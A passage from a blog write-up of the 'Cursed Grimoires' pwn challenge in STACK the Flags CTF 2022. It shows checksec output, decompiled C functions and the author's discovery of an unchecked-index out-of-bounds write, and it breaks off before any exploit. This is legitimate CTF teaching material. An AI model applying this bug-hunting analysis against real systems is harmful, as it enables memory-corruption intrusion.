<!DOCTYPE html>
<html lang="en-us">
  <head>
    <title>STACK the Flags CTF 2022 | Welcome to Chovid99&#39;s Blog</title>

    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width,minimum-scale=1">
<meta property="og:title" content="STACK the Flags CTF 2022" />
<meta property="og:description" content="Writeup for STACK the Flags CTF 2022 by Chovid99" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://chovid99.github.io/posts/stack-the-flags-ctf-2022/" /><meta property="og:image" content="https://chovid99.github.io/site-feature-image.jpeg"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-12-05T16:11:43+07:00" />
<meta property="article:modified_time" content="2022-12-05T16:11:43+07:00" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image:src" content="https://chovid99.github.io/site-feature-image.jpeg"/>

<meta name="twitter:title" content="STACK the Flags CTF 2022"/>
<meta name="twitter:description" content="Writeup for STACK the Flags CTF 2022 by Chovid99"/>
<meta name="twitter:site" content="@Chovid99"/>
<meta name="twitter:creator" content="@Chovid99"/>
<meta property="og:site_name" content="Chovid99's Blog">

<meta name="generator" content="Hugo 0.105.0">


  <META NAME="ROBOTS" CONTENT="INDEX, FOLLOW">


<link rel="stylesheet" href="/css/style.css">
<link rel="stylesheet" href="/css/tocbot.css">



<link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />


  <script async src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-19HP521HQ9');
  </script>



  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css" integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn" crossorigin="anonymous">
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js" integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js" integrity="sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl" crossorigin="anonymous"
    onload="renderMathInElement(document.body, {delimiters: [{left: '$$', right: '$$', display: true}, {left: '\\[', right: '\\[', display: true}, {left: '$', right: '$', display: false}, {left: '\\(', right: '\\)', display: false}]});"></script>






  </head>

  <body>
    <nav class="navigation">
	
		<a href="/"> <span class="arrow">←</span>Home</a>
	
	<a href="/posts">Posts</a>
	<a href="/tags">Tags</a>
	<a href="/about">About</a>

	

	
</nav>


    <main class="main">
      

<section id="single">
    <h1 class="title">STACK the Flags CTF 2022</h1>

    <div class="tip">
        <time datetime="2022-12-05 16:11:43 &#43;0700 &#43;07">Dec 5, 2022</time>
        <span class="split">
          ·
        </span>
        <span>
          6115 words
        </span>
        <span class="split">
          ·
        </span>
        <span>
          29 minute read
        </span>
    </div>

    <div class="content">
      <div class="post-content js-toc-content">
        <p align="center">
  <img src="https://i.imgur.com/JqbSKOa.png" />
</p>
<p>Last weekend, I spent my time competing at STACK the Flags CTF 2022 held by GovTech SG with team <code>PDKT then sad</code>. We got 2nd place in the Open Category. Thanks a lot to GovTech SG for the amazing CTF!</p>
<p>On this CTF, I managed to solve all of the <code>pwn</code> challenges, and today, I will make a writeup on one of the challenges called <code>Cursed Grimoires</code>, because my solution for that challenge is related to the FILE Structure Attack on the recent GLIBC 2.35 (I&rsquo;ve made a promise before to continue my FILE Structure Attack series, so I try to make this writeup as detailed as possible during explaining the FILE Structure part).</p>
<p>I recommend you to read my first article about FILE Structure Attack in <a href="https://chovid99.github.io/posts/file-structure-attack-part-1/" target="_blank" rel="noopener">here</a> to get a basic understanding of how FILE Structure Attack works. You can say that this post is like the second part of that article, but focusing only in the glibc 2.35.</p>
<h1 id="cursed-grimoires">Cursed Grimoires <a href="#cursed-grimoires" class="anchor">#</a></h1>
<h2 id="initial-analysis">Initial Analysis <a href="#initial-analysis" class="anchor">#</a></h2>
<p>We were given a zip file containing the challenge binary called <code>cursed_grimoires</code> and the libc file that is being used to run the binary. Let&rsquo;s start the analysis by checking the properties of the binary via <code>checksec</code>.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>╰─❯ checksec cursed_grimoires
</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:    Full RELRO
</span></span><span style="display:flex;"><span>    Stack:    Canary found
</span></span><span style="display:flex;"><span>    NX:       NX enabled
</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
</span></span></code></pre></td></tr></table>
</div>
</div><p>As we can see, the binary:</p>
<ul>
<li>Full RELRO: It means we can&rsquo;t modify the GOT table.</li>
<li>Canary found: It means the binary tries to protect against buffer overflow by storing a canary value in the stack (Which will throw an error if we do buffer overflow and overwrite it with an incorrect value).</li>
<li>NX enabled: It means the stack area isn&rsquo;t executable (We can&rsquo;t jump to the address in the stack area).</li>
<li>PIE enabled: It means the address of the binary&rsquo;s functions itself will be randomized on each execution.</li>
</ul>
<p>Now, let&rsquo;s check the libc version</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>╰─❯ ./libc.so.6
</span></span><span style="display:flex;"><span>GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35.
</span></span></code></pre></td></tr></table>
</div>
</div><p>Okay, the binary used glibc 2.35, which is quite hard to be exploited.</p>
<p>Now that we have known the properties, seems like the mitigation are quite strong. Let&rsquo;s continue our analysis by disassembling the binary methods one by one.</p>
<h3 id="main">main <a href="#main" class="anchor">#</a></h3>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">int</span> <span style="color:#069;font-weight:bold">__cdecl</span> __noreturn <span style="color:#c0f">main</span>(<span style="color:#078;font-weight:bold">int</span> argc, <span style="color:#069;font-weight:bold">const</span> <span style="color:#078;font-weight:bold">char</span> <span style="color:#555">**</span>argv, <span style="color:#069;font-weight:bold">const</span> <span style="color:#078;font-weight:bold">char</span> <span style="color:#555">**</span>envp)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> v3; <span style="color:#09f;font-style:italic">// [rsp+4h] [rbp-Ch] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>  <span style="color:#078;font-weight:bold">unsigned</span> <span style="color:#069;font-weight:bold">__int64</span> v4; <span style="color:#09f;font-style:italic">// [rsp+8h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>
</span></span><span style="display:flex;"><span>  v4 <span style="color:#555">=</span> __readfsqword(<span style="color:#f60">0x28u</span>);
</span></span><span style="display:flex;"><span>  setup_IO(argc, argv, envp);
</span></span><span style="display:flex;"><span>  v3 <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">while</span> ( <span style="color:#f60">1</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">while</span> ( <span style="color:#f60">1</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      menu();
</span></span><span style="display:flex;"><span>      printf(<span style="color:#c30">&#34;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">Enter choice =&gt; &#34;</span>);
</span></span><span style="display:flex;"><span>      __isoc99_scanf(<span style="color:#c30">&#34;%d&#34;</span>, <span style="color:#555">&amp;</span>v3);
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> ( v3 <span style="color:#555">!=</span> <span style="color:#f60">1</span> )
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>      create_grimoire();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> ( v3 <span style="color:#555">!=</span> <span style="color:#f60">2</span> )
</span></span><span style="display:flex;"><span>      exit(<span style="color:#f60">0</span>);
</span></span><span style="display:flex;"><span>    edit_grimoire();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>From the main function, it will call <code>menu()</code> on each iteration, and we can see that there are three menus that we can select based on our choice&rsquo;s input, <code>create_grimoire</code>, <code>edit_grimoire</code>, and <code>exit</code>. Let&rsquo;s continue our analysis by disassembling those methods.</p>
<h3 id="menu">menu <a href="#menu" class="anchor">#</a></h3>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">unsigned</span> <span style="color:#069;font-weight:bold">__int64</span> <span style="color:#c0f">menu</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">unsigned</span> <span style="color:#069;font-weight:bold">__int64</span> v1; <span style="color:#09f;font-style:italic">// [rsp+8h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>
</span></span><span style="display:flex;"><span>  v1 <span style="color:#555">=</span> __readfsqword(<span style="color:#f60">0x28u</span>);
</span></span><span style="display:flex;"><span>  printf(<span style="color:#c30">&#34;</span><span style="color:#c30;font-weight:bold">\x1B</span><span style="color:#c30">[2J</span><span style="color:#c30;font-weight:bold">\x1B</span><span style="color:#c30">[H&#34;</span>);
</span></span><span style="display:flex;"><span>  puts(s);
</span></span><span style="display:flex;"><span>  puts(<span style="color:#c30">&#34;1. Create Grimoire (Only once)&#34;</span>);
</span></span><span style="display:flex;"><span>  puts(<span style="color:#c30">&#34;2. Edit Grimoire&#34;</span>);
</span></span><span style="display:flex;"><span>  puts(<span style="color:#c30">&#34;3. Finish Grimoire&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span> v1 <span style="color:#555">-</span> __readfsqword(<span style="color:#f60">0x28u</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Okay, this method just prints the available menus and the number that we should input to choose one of the available menus.</p>
<h3 id="create_grimoire">create_grimoire <a href="#create_grimoire" class="anchor">#</a></h3>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">unsigned</span> <span style="color:#069;font-weight:bold">__int64</span> <span style="color:#c0f">create_grimoire</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  size_t size; <span style="color:#09f;font-style:italic">// [rsp+0h] [rbp-10h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>  <span style="color:#078;font-weight:bold">unsigned</span> <span style="color:#069;font-weight:bold">__int64</span> v2; <span style="color:#09f;font-style:italic">// [rsp+8h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>
</span></span><span style="display:flex;"><span>  v2 <span style="color:#555">=</span> __readfsqword(<span style="color:#f60">0x28u</span>);
</span></span><span style="display:flex;"><span>  printf(<span style="color:#c30">&#34;</span><span style="color:#c30;font-weight:bold">\x1B</span><span style="color:#c30">[2J</span><span style="color:#c30;font-weight:bold">\x1B</span><span style="color:#c30">[H&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> ( <span style="color:#555">!</span>GRIMOIRE )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    printf(<span style="color:#c30">&#34;Size of grimoire =&gt; &#34;</span>);
</span></span><span style="display:flex;"><span>    size <span style="color:#555">=</span> <span style="color:#f60">0LL</span>;
</span></span><span style="display:flex;"><span>    __isoc99_scanf(<span style="color:#c30">&#34;%zu&#34;</span>, <span style="color:#555">&amp;</span>size);
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">while</span> ( getchar() <span style="color:#555">!=</span> <span style="color:#f60">10</span> )
</span></span><span style="display:flex;"><span>      ;
</span></span><span style="display:flex;"><span>    GRIMOIRE <span style="color:#555">=</span> (<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>)malloc(size);
</span></span><span style="display:flex;"><span>    printf(<span style="color:#c30">&#34;Write your contents =&gt; &#34;</span>);
</span></span><span style="display:flex;"><span>    fgets(GRIMOIRE, size <span style="color:#555">-</span> <span style="color:#f60">1</span>, stdin);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span> v2 <span style="color:#555">-</span> __readfsqword(<span style="color:#f60">0x28u</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>From the disassemble&rsquo;s result, we can see that the <code>create_grimoire</code> method will do three sequential operations:</p>
<ul>
<li>Check whether the global variable <code>GRIMOIRE</code> is null or not. This means that we can call <code>create_grimoire</code> only one time per execution.</li>
<li>Ask for the size of the grimoire, and then it will call <code>malloc</code> to create a new chunk with the input size.</li>
<li>Ask for the content of the newly created chunk.</li>
</ul>
<p>One thing that we can notice in this method is that we can set a big size for the chunk that we want to create because there isn&rsquo;t any restriction. Keep this in mind first because this will be useful later. Let&rsquo;s move to the <code>edit_grimoire</code> method.</p>
<h3 id="edit_grimoire">edit_grimoire <a href="#edit_grimoire" class="anchor">#</a></h3>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">unsigned</span> <span style="color:#069;font-weight:bold">__int64</span> <span style="color:#c0f">edit_grimoire</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> v1; <span style="color:#09f;font-style:italic">// [rsp+3h] [rbp-Dh]
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>  <span style="color:#078;font-weight:bold">int</span> v2; <span style="color:#09f;font-style:italic">// [rsp+4h] [rbp-Ch] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>  <span style="color:#078;font-weight:bold">unsigned</span> <span style="color:#069;font-weight:bold">__int64</span> v3; <span style="color:#09f;font-style:italic">// [rsp+8h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>
</span></span><span style="display:flex;"><span>  v3 <span style="color:#555">=</span> __readfsqword(<span style="color:#f60">0x28u</span>);
</span></span><span style="display:flex;"><span>  printf(<span style="color:#c30">&#34;</span><span style="color:#c30;font-weight:bold">\x1B</span><span style="color:#c30">[2J</span><span style="color:#c30;font-weight:bold">\x1B</span><span style="color:#c30">[H&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> ( GRIMOIRE )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    printf(<span style="color:#c30">&#34;Index to edit =&gt; &#34;</span>);
</span></span><span style="display:flex;"><span>    __isoc99_scanf(<span style="color:#c30">&#34;%d&#34;</span>, <span style="color:#555">&amp;</span>v2);
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">while</span> ( getchar() <span style="color:#555">!=</span> <span style="color:#f60">10</span> )
</span></span><span style="display:flex;"><span>      ;
</span></span><span style="display:flex;"><span>    printf(<span style="color:#c30">&#34;Replacement =&gt; &#34;</span>);
</span></span><span style="display:flex;"><span>    v1 <span style="color:#555">=</span> getchar();
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">while</span> ( getchar() <span style="color:#555">!=</span> <span style="color:#f60">10</span> )
</span></span><span style="display:flex;"><span>      ;
</span></span><span style="display:flex;"><span>    GRIMOIRE[v2] <span style="color:#555">=</span> v1;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span> v3 <span style="color:#555">-</span> __readfsqword(<span style="color:#f60">0x28u</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>At a glance, we can see that this method will allow us to edit the content of the newly allocated chunk. It will only allow us to edit one char per call (Give the index, and then it will replace the stored value in the given index with the new value that you just gave).</p>
<p>If we read this function method carefully, notice that there is a bug in this method. There isn&rsquo;t any check whether the index that we give is a valid index or not (valid means the index is still inside the allocated chunk&rsquo;s area). This means that we can do Out-Of-Bounds write on any address that we like, relative to the chunks.</p>
